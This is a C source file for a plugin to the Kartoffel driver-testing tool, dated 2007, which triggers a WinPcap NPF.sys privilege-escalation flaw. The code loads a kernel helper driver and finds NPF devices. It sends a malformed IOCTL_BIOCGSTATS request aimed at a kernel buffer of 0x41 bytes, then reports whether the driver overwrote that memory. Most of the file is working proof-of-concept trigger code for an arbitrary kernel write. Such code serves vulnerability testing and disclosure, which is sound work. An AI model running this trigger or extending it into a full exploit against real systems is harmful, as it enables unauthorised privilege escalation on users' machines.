//////////////////////////////////////////////////////////////////////
/////////										07/29/2007
/////////	==============================================
/////////		Winpcap NPF.sys Privilege Escalation
/////////	==============================================
/////////	+ Vulnerability discovered by:
/////////	  Mario Ballano (48bits.com)
/////////	+ K-plugin by: 
/////////	  Ruben Santamarta (reversemode.com)
/////////	+ References:
/////////	  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=550
/////////	  http://blog.48bits.com/?p=127
/////////
//////////////////////////////////////////////////////////////////////	  
/////////
/////////	 K-Plugin for Kartoffel (http://kartoffel.reversemode.com)
/////////	 > Kartoffel -D winpcap_plugin.dll
/////////
//////////////////////////////////////////////////////////////////////


#include "stdafx.h"

#define IOCTL_BIOCGSTATS 9031


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
    return TRUE;
}

int Callback_Overview()
{
	printf("\n");
	printf("==============================================\n");
	printf("    Winpcap NPF.sys Privilege Escalation\n");
	printf("==============================================\n");
	printf("+ Vulnerability discovered by:\n");
	printf("  Mario Ballano (48bits.com)\n");
	printf("+ K-plugin by: \n");
	printf("  Ruben Santamarta (reversemode.com)\n");
	printf("+ References:\n");
	printf("  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=550\n");
	printf("  http://blog.48bits.com/?p=127\n\n");
	return 1;
}

 int Callback_Direct( char *lpInitStr )
{
	KARTO_DIRS	kDirs;
	WCHAR		**lpDevices = NULL;
	LPVOID		pKern=0;
	HANDLE		hDevice,hKdevice;
	char		szKdriver[MAX_PATH];
	DWORD		lpoutBuff[4]; 
	DWORD		dwNum = 0,i = 0, b=0, junk;
	BOOL		bVulnerable = FALSE;
	int			status=0;

	Callback_Overview();
	
	hKdevice = OpenKDevice();

	if (hKdevice == INVALID_HANDLE_VALUE) 
	{
		InitializePaths(&kDirs);
	
		sprintf(szKdriver,
				"%s\\kartoffel.sys",
				kDirs.KARTO_PATH);

		printf("\n\n[+] Kartoffel.sys not detected. Loading %s\n\n",szKdriver);
		if( !LoadDriver( szKdriver,"Kartoffel") )
		{
			printf("[!] Unable to load kartoffel.sys\n");
			exit(0);
		}
		
		hKdevice = OpenKDevice();
		
		if( hKdevice ==INVALID_HANDLE_VALUE ) return 0;
	}

	dwNum = EnumSymbolics( ( WCHAR** )&lpDevices );
	
	printf("\n\n[+] Searching vulnerable device...");

	for( i = 0; i< dwNum; i++ )
	{
		if( StrStrIW( lpDevices[i], L"\\\\.\\NPF_{" ) != NULL)
		{
			hDevice = OpenDevice(lpDevices[i],
								TRUE,
								FALSE,
								FALSE,
								0,
								0);
					
			if( hDevice != INVALID_HANDLE_VALUE )
			{

				printf("[+] Opening Device: %ws...",lpDevices[i]);
				printf("OK\n\n");
								
				pKern = kalloc( 0x20,0);
			
				if ( pKern )
				{
					memset(lpoutBuff,0x41,0x10);
					kwrite( pKern, (LPVOID)lpoutBuff, 0x10);
					printf("[+] Sending malformed request...\n\n");
					DeviceIoControl(hDevice,
									IOCTL_BIOCGSTATS,
									(LPVOID)0,0,
									pKern,0x10,
									&junk,
									NULL);
					kread ( (LPVOID)lpoutBuff,pKern, 0x10,FALSE);
					printf("\tResponse received:\n");
					
					for(b = 0;b<4; b++)
					{
						if( lpoutBuff[b] != 0x41414141 ) bVulnerable = TRUE;
						printf("\t0%d: %x\n",b,lpoutBuff[b]);	
					}

					if( bVulnerable )
					{
						
						printf("\n**********************************\n");
						printf("\n[!!] This system is vulnerable\n\n");
						printf("**********************************\n");
						status=TRUE;
					}
				}
			}
		}

	}
	CloseHandle(hDevice);
	CloseHandle(hKdevice);
	kglobalfree();
	if(!status) printf("\n[+] The system seems to be patched\n");
	return status;
}


